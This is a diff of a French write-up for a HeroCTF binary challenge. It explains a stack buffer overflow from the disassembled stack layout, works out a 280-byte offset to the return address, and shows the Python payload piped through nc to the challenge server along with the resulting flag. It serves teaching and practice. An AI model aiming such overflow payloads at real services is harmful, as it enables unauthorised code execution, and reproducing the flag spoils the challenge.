@@ -93,12 +93,18 @@ On constate dans le main que l'on peut écrire sans limite dans le buffer d'inpu
 
 Dans l'idée on pourrait alors se dire qu'il faut écrire 256 caractères suivis de notre adresse (sans oublier le little endian) et que le tour est joué ! Eh oui... Mais non.
 
-// TODO
+```assembly
+120: int main (int argc, char **argv);
+; var char **var_120h @ rbp-0x120
+; var int64_t var_114h @ rbp-0x114
+; var char *s @ rbp-0x110
+```
+Notre input est stocké dans le buffer identifié comme `char *s` (qui fait donc une taille de 256 octets). L'adresse de retour (un quadword soit 8 octets) est pop de la stack via l'instruction `ret` puis mise dans `rip` (instruction pointer) en fin de fonction.
+Pour réécrire celle-ci, il nous faudra donc overwrite les int `var_114h` et `var_120h` (8 octets chacun) puis `rbp` (base pointer, qui indique le début de la stack) (8 octets également).
 
-Il nous faudra finalement 280 caractères avant d'avoir la main sur l'adresse de retour.
-
+Il nous faudra donc finalement 256+(8\*3) = 280 caractères avant d'avoir la main sur l'adresse de retour.
 On peut alors résoudre le challenge grâce à Python (eh oui, encore et toujours)
-```python
+```bash
 $ python -c "print('A')*280+'\x82\x11\x40\x00\x00\x00\x00\x00'" |  nc heroctf.fr 3001
 Donne-moi ton nom little hackerz : Ca sera pas si simple cette fois jeune "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 FFlag: HeroCTF{4_l177l3_h4rd3r_bu7_571ll_345y_0101}
